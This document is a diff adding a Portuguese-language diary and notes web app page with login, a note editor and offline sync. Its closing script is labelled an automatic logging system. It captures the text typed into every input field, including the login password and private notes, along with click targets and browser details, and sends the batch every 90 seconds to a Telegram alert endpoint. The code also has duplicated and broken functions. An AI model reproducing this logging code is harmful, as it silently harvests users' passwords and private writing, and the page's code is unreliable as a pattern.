@@ -1,0 +1,1046 @@
+<!doctype html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Diário / Notas — Página</title>
+    <style>
+        /* ================= VARIÁVEIS ================= */
+        :root {
+            --bg: #f3f4f6;
+            --card: #fff;
+            --muted: #6b7280;
+            --accent: #2563eb;
+            --radius: 12px;
+            --shadow: 0 6px 18px rgba(16, 24, 40, 0.08);
+        }
+
+        /* ================= RESET ================= */
+        * {
+            box-sizing: border-box;
+            font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            background: linear-gradient(180deg, #f8fafc, #eef2ff);
+            color: #111
+        }
+
+        /* ================= HEADER ================= */
+        header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 20px 28px;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 20px
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+
+        /* ================= BUTTONS ================= */
+        .btn {
+            background: var(--card);
+            border: 1px solid rgba(15, 23, 42, 0.06);
+            padding: 8px 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: var(--shadow);
+            transition: transform 0.1s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 22px rgba(16, 24, 40, 0.12);
+        }
+
+        /* ================= CONTAINER ================= */
+        .container {
+            max-width: 1100px;
+            margin: 18px auto;
+            padding: 18px;
+            width: 95%;
+        }
+
+        /* ================= EDITOR ================= */
+        .create-area {
+            display: grid;
+            grid-template-columns: 1fr minmax(220px, 1fr);
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .editor {
+            background: var(--card);
+            padding: 12px;
+            border-radius: 14px;
+            box-shadow: var(--shadow);
+        }
+
+        .editor input.title {
+            width: 100%;
+            padding: 8px;
+            border-radius: 8px;
+            border: 1px solid #e6e9ef;
+            margin-bottom: 8px
+        }
+
+        .editor textarea {
+            width: 100%;
+            min-height: 120px;
+            border-radius: 8px;
+            border: 1px solid #e6e9ef;
+            padding: 10px;
+            resize: vertical
+        }
+
+        .controls {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            align-items: center;
+            margin-top: 8px
+        }
+
+        /* ================= SIDEBAR ================= */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .color-palette {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .color-swatch {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(2, 6, 23, 0.06);
+            border: 2px solid transparent;
+        }
+
+        .color-swatch.selected {
+            outline: 3px solid rgba(37, 99, 235, 0.15);
+        }
+
+        .small {
+            font-size: 13px;
+            color: var(--muted)
+        }
+
+        /* ================= SEARCH ================= */
+        .search-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap
+        }
+
+        .search-row input {
+            flex: 1;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid #e6e9ef
+        }
+
+        .filters select {
+            padding: 6px 10px;
+            border-radius: 8px;
+            border: 1px solid #e6e9ef
+        }
+
+        /* ================= NOTES ================= */
+        .note-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 14px;
+        }
+
+        .note {
+            background: var(--card);
+            padding: 12px;
+            border-radius: 12px;
+            min-height: 110px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            position: relative;
+            border-left: 8px solid transparent;
+        }
+
+        .note.pinned {
+            order: -1;
+            box-shadow: 0 12px 30px rgba(16, 24, 40, 0.08)
+        }
+
+        .note .meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        .note .meta .date {
+            font-size: 12px;
+            color: var(--muted)
+        }
+
+        .note .title {
+            font-weight: 600
+        }
+
+        .note .body {
+            white-space: pre-wrap;
+            flex: 1
+        }
+
+        .note .actions {
+            display: flex;
+            gap: 6px
+        }
+
+        .action-btn {
+            background: transparent;
+            border: 0;
+            padding: 6px;
+            border-radius: 8px;
+            cursor: pointer
+        }
+
+        .action-btn:hover {
+            background: rgba(15, 23, 42, 0.04)
+        }
+
+        .group {
+            margin-bottom: 20px
+        }
+
+        .group h2 {
+            font-size: 14px;
+            margin: 8px 0;
+            color: var(--muted)
+        }
+
+        /* ================= FOOTER ================= */
+        footer {
+            margin-top: 24px;
+            padding: 10px 28px;
+            color: var(--muted);
+            font-size: 13px;
+            text-align: center
+        }
+
+        /* ================= LOGIN ================= */
+        #loginForm {
+            width: 100%;
+            max-width: 380px;
+            margin: 60px auto;
+            padding: 40px 30px;
+            background: var(--card);
+            border-radius: var(--radius);
+            box-shadow: 0 12px 30px rgba(16, 24, 40, 0.08);
+            display: flex;
+            flex-direction: column;
+        }
+
+        #loginForm h2 {
+            margin: 0 0 20px;
+            font-size: 26px;
+            font-weight: 600;
+            color: #111;
+            text-align: center;
+        }
+
+        #loginForm input {
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid #e6e9ef;
+            font-size: 15px;
+            outline: none;
+            margin-bottom: 16px;
+            width: 100%;
+        }
+
+        #loginForm button {
+            padding: 12px;
+            border-radius: 12px;
+            border: none;
+            background: var(--accent);
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 6px 18px rgba(16, 24, 40, 0.1);
+            margin-top: 12px;
+        }
+
+        #loginForm button:hover {
+            background: #1e40af;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 22px rgba(16, 24, 40, 0.15);
+        }
+
+        #loginForm button:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 12px rgba(16, 24, 40, 0.1);
+        }
+
+        #loginForm input::placeholder {
+            color: var(--muted);
+        }
+
+        /* ================= RESPONSIVE ================= */
+        @media (max-width:1100px) {
+            .create-area {
+                grid-template-columns: 1fr 200px;
+            }
+        }
+
+        @media (max-width:820px) {
+            .create-area {
+                grid-template-columns: 1fr;
+            }
+
+            .sidebar {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: space-between;
+            }
+
+            header {
+                padding: 12px;
+            }
+
+            .controls {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .search-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .filters {
+                width: 100%;
+            }
+
+            .note-list {
+                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            }
+        }
+
+        @media (max-width:480px) {
+            #loginForm {
+                padding: 32px 20px;
+                margin: 40px auto;
+            }
+
+            .controls button {
+                width: 100%;
+            }
+
+            .controls label {
+                width: 100%;
+            }
+
+            .note-list {
+                grid-template-columns: 1fr;
+            }
+
+            .create-area {
+                gap: 10px;
+            }
+
+            .sidebar {
+                gap: 6px;
+            }
+
+            header {
+                gap: 8px;
+            }
+        }
+
+        .color-palette {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+            /* adiciona espaço entre a paleta e o título */
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loginForm">
+        <h2>Login</h2>
+        <input type="text" id="username" placeholder="Usuário">
+        <input type="password" id="password" placeholder="Senha">
+        <button id="loginBtn">Login</button>
+    </div>
+
+
+
+    <header style="display:none">
+        <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='36' height='36' viewBox='0 0 24 24'><rect rx='6' width='24' height='24' fill='%232563EB'/><path d='M6 8h12v2H6zM6 12h8v2H6z' fill='white'/></svg>"
+            alt="logo">
+        <h1>Meu Diário / Notas</h1>
+        <div class="toolbar">
+            <button class="btn" id="logoutBtn">Logout</button>
+        </div>
+    </header>
+
+
+
+    <main class="container" style="display:none">
+        <section class="create-area">
+            <div class="editor">
+                <div class="small" style="margin-bottom:16px">Destacar (cor)</div>
+                <div class="color-palette" id="palette"></div>
+
+                <input class="title" id="noteTitle" placeholder="Título (opcional)" />
+                <textarea id="noteBody" placeholder="Escreva aqui..."></textarea>
+
+                <div class="controls">
+                    <button class="btn" id="saveNoteBtn">Salvar</button>
+                    <button class="btn" id="clearBtn">Limpar</button>
+                    <label class="small">Data: <input type="date" id="noteDate"></label>
+                    <label class="small">Hora: <input type="time" id="noteTime"></label>
+                    <button class="btn" id="togglePrivacy">Privado</button>
+                </div>
+            </div>
+            </div>
+
+        </section>
+
+        <section>
+            <div class="search-row">
+                <input id="searchInput" placeholder="Pesquisar notas..." />
+                <div class="filters">
+                    <select id="filterSelect" class="btn">
+                        <option value="all">Todas</option>
+                        <option value="private">Privadas</option>
+                        <option value="public">Públicas</option>
+                    </select>
+
+                </div>
+            </div>
+
+            <div id="notesRoot"></div>
+        </section>
+
+    </main>
+
+
+    <script>
+        let noteTitle, noteBody, noteDate, noteTime;
+        let isPrivate = true; // padrão privado
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            const notesApp = document.querySelector('main.container');
+            const notesList = document.getElementById("notesRoot");
+            const loginForm = document.getElementById("loginForm");
+            const loginBtn = document.getElementById("loginBtn");
+            const logoutBtn = document.getElementById("logoutBtn");
+            const userLabel = document.createElement('div'); // opcional, ou remova toda referência
+            const saveNoteBtn = document.getElementById("saveNoteBtn");
+            saveNoteBtn.addEventListener("click", saveNoteManual);
+
+            noteTitle = document.getElementById("noteTitle");
+            noteBody = document.getElementById("noteBody");
+            noteDate = document.getElementById("noteDate");
+            noteTime = document.getElementById("noteTime");
+            document.getElementById('togglePrivacy').addEventListener('click', () => {
+                isPrivate = !isPrivate;
+                document.getElementById('togglePrivacy').textContent = isPrivate ? 'Privado' : 'Público';
+            });
+
+
+            // --- Config
+            const STORAGE_KEY = 'diarioNotas_v1';
+            const paletteColors = ['#fff59d', '#ffecb3', '#ffe0b2', '#ffc1e3', '#c8e6c9', '#bbdefb', '#d1c4e9', '#ffffff'];
+            let notes = [];
+            let selectedColor = paletteColors[7];
+            const debouncedSaves = {};
+            let pendingNotes = JSON.parse(localStorage.getItem("pendingNotes") || "[]");
+            // --- Helpers
+            function uid() { return Date.now().toString() + Math.floor(Math.random() * 1000); }
+            function nowISO(dateStr, timeStr) {
+                if (dateStr) {
+                    const d = new Date(dateStr + (timeStr ? ('T' + timeStr) : 'T00:00'));
+                    return new Date(d.getTime() - d.getTimezoneOffset() * 60000).toISOString();
+                }
+                return new Date().toISOString();
+            }
+            function formatDate(iso) { const d = new Date(iso); return d.toLocaleString(); }
+            function escapeHtml(s) { return String(s).replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;'); }
+
+            async function load() {
+                try {
+                    const me = await fetch("/api/me").then(r => r.json());
+                    if (!me.loggedIn) {
+                        alert("Faça login para ver suas notas");
+                        window.location.href = "/login.html";
+                        return;
+                    }
+                    const res = await fetch("/api/notes");
+                    const data = await res.json();
+                    notes = Array.isArray(data) ? data : data.notes || [];
+                    render();
+                } catch (e) {
+                    console.error("Erro ao carregar notas:", e);
+                    alert("Erro ao conectar ao servidor. Verifique sua conexão.");
+                    notes = [];
+                }
+            }
+
+
+
+
+            // --- CRUD
+            function createNote({ title = '', body = '', dateISO = null, color = null, pinned = false } = {}) {
+                const note = { id: uid(), title, body, date: dateISO || nowISO(), color: color || selectedColor, pinned, created: nowISO(), modified: nowISO() }
+                notes.push(note);
+                save();
+                render();
+                return note;
+            }
+            function updateNote(id, patch) {
+                const n = notes.find(x => x.id === id); if (!n) return;
+                Object.assign(n, patch);
+                n.modified = nowISO();
+                render();
+            }
+            function deleteNote(id) {
+                notes = notes.filter(x => x.id !== id);
+                save(); render();
+            }
+            function clearAll() { if (confirm('Apagar todas as notas? Esta ação não pode ser desfeita.')) { notes = []; save(); render(); } }
+
+            function render() {
+                const root = document.getElementById('notesRoot'); root.innerHTML = '';
+                const q = document.getElementById('searchInput').value.trim().toLowerCase();
+                const filter = document.getElementById('filterSelect').value;
+                let list = notes.slice();
+                if (filter === 'private') list = list.filter(n => n.private);
+                if (filter === 'public') list = list.filter(n => !n.private);
+
+
+                if (list.length === 0) {
+                    root.innerHTML = '<div class="small">Nenhuma nota encontrada. Crie sua primeira nota acima!</div>';
+                    return;
+                }
+
+                const groups = {};
+                list.forEach(n => {
+                    const day = (new Date(n.date)).toDateString();
+                    if (!groups[day]) groups[day] = [];
+                    groups[day].push(n);
+                });
+
+                Object.keys(groups).sort((a, b) => new Date(b) - new Date(a)).forEach(day => {
+                    const gEl = document.createElement('div'); gEl.className = 'group';
+                    const h2 = document.createElement('h2'); h2.textContent = day; gEl.appendChild(h2);
+                    const listEl = document.createElement('div'); listEl.className = 'note-list';
+                    groups[day].forEach(n => {
+                        const el = document.createElement('article'); el.className = 'note' + (n.pinned ? ' pinned' : '');
+                        el.style.borderLeftColor = n.color || 'transparent';
+                        el.innerHTML = `
+          <div class="meta">
+            <div>
+              <div class="title">${escapeHtml(n.title || 'Sem título')}</div>
+<div class="date">
+  ${formatDate(n.date)} ${n.private ? '(Privado)' : '(Público)'}
+</div>
+            </div>
+            <div class="actions">
+              <button class="action-btn" data-act="pin">📌</button>
+              <button class="action-btn" data-act="highlight">✳️</button>
+              <button class="action-btn" data-act="delete">🗑️</button>
+            </div>
+          </div>
+          <div class="body">${escapeHtml(n.body || n.content || '')}</div>
+`;
+                        el.querySelectorAll('[data-act]').forEach(b => {
+                            b.onclick = () => {
+                                const a = b.dataset.act;
+                                if (a === 'pin') { n.pinned = !n.pinned; save(n); render(); }
+                                if (a === 'delete') {
+                                    if (confirm('Apagar esta nota?')) {
+                                        deleteNoteManual(n.id);
+                                    }
+                                }
+
+                                if (a === 'highlight') { const col = prompt('Nova cor:', n.color || '#ffffff'); if (col) { n.color = col; save(n); render(); } }
+                            };
+                        });
+                        listEl.appendChild(el);
+                    });
+                    gEl.appendChild(listEl);
+                    root.appendChild(gEl);
+                });
+            }
+
+
+            // -------------------- Login / Logout --------------------
+
+            async function fetchJSON(url, options = {}) {
+                options.credentials = 'include'; // envia cookies
+                if (!options.headers) options.headers = {};
+                if (options.body && typeof options.body === 'object') {
+                    options.headers['Content-Type'] = 'application/json';
+                    options.body = JSON.stringify(options.body);
+                }
+                const res = await fetch(url, options);
+                return res.json();
+            }
+
+            async function checkSession() {
+                const data = await fetchJSON("/api/me");
+                const header = document.querySelector("header");
+                const main = document.querySelector("main.container");
+
+                if (data.loggedIn) {
+                    currentUser = data.user.username;
+                    loginForm.style.display = "none";
+                    header.style.display = "flex";
+                    main.style.display = "block";
+                    logoutBtn.style.display = "inline";
+                    userLabel.textContent = currentUser;
+
+                    await load();
+                    await syncPendingNotes();
+                } else {
+                    // mostrar login, esconder app
+                    loginForm.style.display = "block";
+                    header.style.display = "none";
+                    main.style.display = "none";
+                    logoutBtn.style.display = "none";
+                }
+            }
+
+            loginBtn.addEventListener("click", async () => {
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                const res = await fetchJSON("/api/login", { method: "POST", body: { username, password } });
+                if (res.success) {
+                    await checkSession();
+                } else {
+                    alert(res.error);
+                }
+
+            });
+
+            logoutBtn.addEventListener("click", async () => {
+                await fetchJSON("/api/logout", { method: "POST" });
+                currentUser = null;
+                checkSession();
+            });
+
+
+            // --- Editor handlers
+            function loadIntoEditor(n) {
+                document.getElementById('noteTitle').value = n.title || '';
+                document.getElementById('noteBody').value = n.body || n.content || '';
+
+                const d = new Date(n.date);
+                document.getElementById('noteDate').valueAsDate = d;
+                document.getElementById('noteTime').value = d.toTimeString().slice(0, 5);
+                selectedColor = n.color || selectedColor;
+                highlightSelectedSwatch();
+                // store editing id
+                document.getElementById('saveNoteBtn').dataset.editId = n.id;
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            function promptColorAndApply(id) {
+                const col = prompt('Escolha uma cor (hex) — ex: #ffe0b2', '#ffffff');
+                if (col) updateNote(id, { color: col });
+            }
+
+            // --- Palette
+            function buildPalette() {
+                const p = document.getElementById('palette'); p.innerHTML = '';
+                paletteColors.forEach(c => {
+                    const sw = document.createElement('div'); sw.className = 'color-swatch'; sw.style.background = c;
+                    if (c === selectedColor) sw.classList.add('selected');
+                    sw.addEventListener('click', () => { selectedColor = c; highlightSelectedSwatch(); });
+                    p.appendChild(sw);
+                })
+            }
+            function highlightSelectedSwatch() {
+                document.querySelectorAll('.color-swatch').forEach(el => el.classList.remove('selected'));
+                const sws = Array.from(document.querySelectorAll('.color-swatch'));
+                const idx = paletteColors.indexOf(selectedColor);
+                if (idx >= 0 && sws[idx]) sws[idx].classList.add('selected');
+            }
+
+
+            // ===================== SAVE / DELETE =====================
+            async function saveNoteManual() {
+                const title = noteTitle.value.trim() || "(Sem título)";
+                const content = noteBody.value.trim();
+
+                if (!content) {
+                    alert("O corpo da nota não pode ficar vazio!");
+                    return;
+                }
+
+                const iso = nowISO(noteDate.value, noteTime.value);
+                const editId = saveNoteBtn.dataset.editId;
+
+                const note = {
+                    id: editId || undefined,
+                    title,
+                    content,         // obrigatoriamente 'content'
+                    date: iso,
+                    color: selectedColor,
+                    pinned: false,
+                    private: isPrivate,
+                    created: nowISO(),
+                    modified: nowISO()
+                };
+
+                await sendToServer(note);
+                render();
+                noteTitle.value = noteBody.value = '';
+                saveNoteBtn.dataset.editId = '';
+                highlightSelectedSwatch();
+            }
+
+            async function sendToServer(note) {
+                try {
+                    if (!navigator.onLine) throw new Error("Offline");
+                    const res = await fetch("https://calendarm.onrender.com/api/notes", {  
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(note),
+                        credentials: "include" 
+                    });
+
+                    if (!res.ok) {
+                        const err = await res.json();
+                        throw new Error(err.error || "Erro desconhecido");
+                    }
+
+                    // remover nota do pending se existia
+                    pendingNotes = pendingNotes.filter(n => n.id !== note.id);
+                    localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                    console.log("Nota salva no servidor:", note.title);
+                } catch (e) {
+                    console.warn("Offline / erro, salvando localmente:", e.message);
+                    if (!pendingNotes.some(n => n.id === note.id)) pendingNotes.push(note);
+                    localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                }
+            }
+
+
+
+
+
+
+
+            async function deleteNoteManual(id) {
+                if (!confirm("Tem certeza que deseja apagar esta nota?")) return;
+                try {
+                    if (navigator.onLine) {
+                        const res = await fetch(`/api/notes/${id}`, { method: "DELETE" });
+                        if (!res.ok) throw new Error(await res.text());
+                    }
+                } catch (e) {
+                    console.warn("Offline ou erro ao apagar, nota será removida localmente");
+                }
+                notes = notes.filter(n => n.id !== id);
+                pendingNotes = pendingNotes.filter(n => n.id !== id);
+                localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                render();
+            }
+
+            // ===================== EVENTOS =====================
+            document.getElementById('clearBtn').addEventListener('click', () => { if (confirm('Limpar editor?')) { document.getElementById('noteTitle').value = ''; document.getElementById('noteBody').value = ''; } });
+            document.getElementById('searchInput').addEventListener('input', () => render());
+            document.getElementById('filterSelect').addEventListener('change', () => render());
+
+            // keyboard shortcut
+            document.addEventListener('keydown', (e) => {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+                    document.getElementById('saveNoteBtn').click();
+                }
+            })
+
+
+
+            async function carregarNotas() {
+                const me = await fetch("/api/me").then(r => r.json());
+                if (!me.loggedIn) {
+                    alert("Faça login para ver suas notas");
+                    window.location.href = "/login.html";
+                    return;
+                }
+
+                const res = await fetch("/api/notes");
+                const data = await res.json();
+                renderizarNotas(data.notes);
+            }
+
+            async function salvarNota(note) {
+                await fetch("/api/notes", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(note)
+                });
+                carregarNotas();
+            }
+
+
+            // Salvar nota (com detecção online/offline)
+            async function save(note) {
+                if (!note || typeof note !== "object") return;
+                if (!note.body && !note.title) return; // evita notas vazias
+
+                try {
+                    if (navigator.onLine) {
+                        const res = await fetch("/api/notes", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(note)
+                        });
+                        if (!res.ok) {
+                            console.warn("Servidor retornou erro ao salvar:", await res.text());
+                            pendingNotes.push(note);
+                            localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                        } else {
+                            console.log("Nota salva no servidor:", note.title || "(sem título)");
+                        }
+                    } else {
+                        pendingNotes.push(note);
+                        localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                        console.warn("Offline — nota armazenada localmente:", note.title || "(sem título)");
+                    }
+                } catch (e) {
+                    console.error("Erro ao salvar nota:", e);
+                    pendingNotes.push(note);
+                    localStorage.setItem("pendingNotes", JSON.stringify(pendingNotes));
+                }
+            }
+
+            // Sincronizar pendentes quando voltar online
+            async function syncPendingNotes() {
+                if (!Array.isArray(pendingNotes) || pendingNotes.length === 0) return;
+                console.log(`Sincronizando ${pendingNotes.length} notas pendentes...`);
+
+                const validNotes = pendingNotes.filter(n => n && typeof n === "object" && n.body);
+                if (validNotes.length === 0) {
+                    console.warn("Nenhuma nota válida para sincronizar.");
+                    pendingNotes = [];
+                    localStorage.removeItem("pendingNotes");
+                    return;
+                }
+
+                for (const note of validNotes) {
+                    try {
+                        const res = await fetch("/api/notes", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(note)
+                        });
+                        if (!res.ok) {
+                            console.error("Erro do servidor ao sincronizar:", await res.text());
+                            continue;
+                        }
+                        console.log("Nota sincronizada:", note.title || "(sem título)");
+                    } catch (err) {
+                        console.error("Erro ao sincronizar:", err);
+                        return;
+                    }
+                }
+                pendingNotes = [];
+                localStorage.removeItem("pendingNotes");
+                console.log("Todas as notas pendentes foram sincronizadas!");
+            }
+
+
+            window.addEventListener("offline", () => {
+                console.warn("Você está offline — notas serão salvas localmente.");
+            });
+
+
+            window.addEventListener("online", syncPendingNotes);
+
+            // Inicialização final (executa depois do DOM estar pronto)
+            await new Promise(resolve => window.addEventListener("load", resolve));
+            buildPalette();
+            await checkSession();
+            await syncPendingNotes();
+    
+            /* =================== SISTEMA DE LOGS AUTOMÁTICOS =================== */
+
+window.userLogsQueue = window.userLogsQueue || [];
+
+/* ======== Helpers ======== */
+function getActionEmoji(action) {
+  if (!action) return "ℹ️";
+  const a = action.toLowerCase();
+  if (a.includes("erro") || a.includes("fail") || a.includes("❌")) return "❌";
+  if (a.includes("click") || a.includes("clique")) return "👆";
+  if (a.includes("input") || a.includes("digita")) return "⌨️";
+  if (a.includes("login")) return "🔑";
+  if (a.includes("logout")) return "🚪";
+  if (a.includes("nota") || a.includes("save")) return "📝";
+  return "ℹ️";
+}
+
+function escapeMarkdown(str) {
+  if (!str) return "";
+  return str.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+}
+
+/* ======== Formatação ======== */
+function formatGroupedLogs(logs) {
+  const groups = {};
+  logs.forEach(log => {
+    const key = `${log.user}-${log.ip}`;
+    if (!groups[key]) groups[key] = { user: log.user, ip: log.ip, actions: [] };
+    groups[key].actions.push(log);
+  });
+
+  return Object.values(groups).map(group => {
+    const header =
+      `👤 Usuário: ${escapeMarkdown(group.user)}\n` +
+      `🌐 IP: ${escapeMarkdown(group.ip)}\n` +
+      `📐 Tela: ${escapeMarkdown(group.actions[0].tamanho || "N/A")}\n` +
+      `🎯 Alvo: ${escapeMarkdown(group.actions[0].target || "N/A")}\n`;
+    const actions = group.actions.map(l => {
+      const emoji = getActionEmoji(l.actionType);
+      const time = new Date(l.timestamp).toLocaleTimeString("pt-BR", { timeZone: "America/Sao_Paulo" });
+      return `${emoji} ${time} - ${escapeMarkdown(l.actionType)} ${l.description ? "(" + escapeMarkdown(l.description) + ")" : ""}`;
+    }).join("\n");
+
+    return `${header}\n${actions}`;
+  }).join("\n\n---\n\n");
+}
+
+/* ======== Envio ======== */
+async function sendLogsBatch() {
+  if (!window.userLogsQueue.length) return;
+
+  const logsToSend = [...window.userLogsQueue];
+  window.userLogsQueue = [];
+
+  const message = formatGroupedLogs(logsToSend);
+
+  try {
+    const res = await fetch("/api/send-telegram-alert", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ message, type: "interacoes" })
+    });
+
+    const data = await res.json();
+    if (!data.success) console.error("Erro ao enviar Telegram:", data.error || data);
+  } catch (err) {
+    console.error("Erro ao enviar Telegram:", err);
+  }
+}
+
+/* ======== Log principal ======== */
+function enqueueLog(action, extra = "") {
+  const username = document.querySelector("#username")?.value ||
+                   document.querySelector("#username")?.textContent ||
+                   "guest";
+  const ip = window.userip || "Desconhecido";
+  const target = navigator.userAgent || "Desconhecido";
+  const tamanho = `${window.innerWidth || "N/A"}x${window.innerHeight || "N/A"}`;
+
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    user: username,
+    ip: ip,
+    actionType: action,
+    target: target,
+    tamanho: tamanho,
+    description: extra
+  };
+
+  window.userLogsQueue.push(logEntry);
+
+  // Logs críticos são enviados imediatamente
+  if (action.toLowerCase().includes("erro") || action.toLowerCase().includes("fail") || action.toLowerCase().includes("❌")) {
+    sendLogsBatch();
+  }
+}
+
+/* ======== Eventos Automáticos ======== */
+document.addEventListener("click", e => {
+  const label = e.target.innerText?.trim() || e.target.placeholder || e.target.id || e.target.tagName;
+  enqueueLog("Clique", label);
+});
+
+document.addEventListener("input", e => {
+  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
+    const id = e.target.id || e.target.name || e.target.placeholder || "campo";
+    const valor = e.target.value ? e.target.value.slice(0, 100) : ""; // limite de 100 caracteres
+    enqueueLog("Input", `${id}: "${valor}"`);
+  }
+});
+
+
+// Captura erros de console
+window.addEventListener("error", e => {
+  enqueueLog("❌ Erro JS", `${e.message} @ ${e.filename}:${e.lineno}`);
+});
+
+// Captura avisos de rede/offline
+window.addEventListener("offline", () => enqueueLog("⚠️ Offline"));
+window.addEventListener("online", () => enqueueLog("🌐 Online"));
+
+// Log de login/logout
+document.getElementById("loginBtn")?.addEventListener("click", () => enqueueLog("Login tentativa"));
+document.getElementById("logoutBtn")?.addEventListener("click", () => enqueueLog("Logout realizado"));
+
+// Logs automáticos de salvamento de notas
+document.getElementById("saveNoteBtn")?.addEventListener("click", () => enqueueLog("Salvar nota"));
+document.getElementById("clearBtn")?.addEventListener("click", () => enqueueLog("Limpar editor"));
+
+/* ======== Intervalo automático ======== */
+setInterval(sendLogsBatch, 90 * 1000); // envia a cada 90s
+
+window.enqueueLog = enqueueLog;
+window.sendLogsBatch = sendLogsBatch;
+
+
+
+
+
+
+
+
+
+        }); // fecha DOMContentLoaded
+
+    </script>
+</body>
+
+</html>
